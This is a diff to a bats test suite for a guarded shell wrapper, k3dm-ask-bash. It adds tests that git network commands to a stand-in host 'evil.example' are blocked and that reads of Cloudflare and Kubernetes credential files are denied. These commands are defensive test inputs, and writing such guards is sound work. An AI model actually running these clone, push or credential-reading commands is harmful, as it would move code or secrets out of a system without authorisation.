@@ -849,15 +849,50 @@ PY
     done
 }
 
+@test "k3dm-ask-bash denies git network subcommands" {
+    local repo_root
+    repo_root="$(cd "${BATS_TEST_DIRNAME}/../../.." && pwd)"
+
+    for command in \
+        "git clone https://evil.example/x" \
+        "git fetch origin" \
+        "git pull" \
+        "git push origin main" \
+        "git remote add evil https://evil.example/x" \
+        "git ls-remote https://evil.example/x" \
+        "git archive --remote=ssh://evil.example/x HEAD"; do
+        run "${repo_root}/bin/k3dm-ask-bash" -c "$command"
+        [ "$status" -eq 1 ]
+        [[ "$output" == *"Blocked"* ]]
+    done
+}
+
+@test "k3dm-ask-bash allows local read-only git inspection" {
+    local repo_root
+    repo_root="$(cd "${BATS_TEST_DIRNAME}/../../.." && pwd)"
+
+    # The egress guard must not over-block local, network-free git. Use fixed-output
+    # subcommands (git's own exit code varies by env, e.g. safe.directory; and diff/show
+    # output could echo the deny marker from this very change), asserting no denial.
+    for command in "git --version" "git rev-parse --is-inside-work-tree"; do
+        run "${repo_root}/bin/k3dm-ask-bash" -c "$command"
+        [[ "$output" != *"❌ Blocked"* ]]
+        [[ "$output" != *"❌ Out of scope"* ]]
+    done
+}
+
 @test "k3dm-ask-bash denies credential-dir reads" {
     local repo_root
     repo_root="$(cd "${BATS_TEST_DIRNAME}/../../.." && pwd)"
 
-    run "${repo_root}/bin/k3dm-ask-bash" -c "cat \"${HOME}/.cloudflared/anything\"" "${HOME}/.cloudflared/anything"
+    # Use fixed system credential paths, not ${HOME}: this suite overrides HOME to a
+    # mktemp -d, which on Linux lives under /tmp — an in-scope diagnostic prefix — so a
+    # ${HOME}-derived path would be allowed and never exercise the out-of-scope denial.
+    run "${repo_root}/bin/k3dm-ask-bash" -c "cat \"/etc/cloudflared/cert.pem\"" "/etc/cloudflared/cert.pem"
     [ "$status" -eq 1 ]
     [[ "$output" == *"Out of scope"* || "$output" == *"scope"* ]]
 
-    run "${repo_root}/bin/k3dm-ask-bash" -c "cat \"${HOME}/.kube/config\"" "${HOME}/.kube/config"
+    run "${repo_root}/bin/k3dm-ask-bash" -c "cat \"/etc/kubernetes/admin.conf\"" "/etc/kubernetes/admin.conf"
     [ "$status" -eq 1 ]
     [[ "$output" == *"Out of scope"* || "$output" == *"scope"* ]]
 }
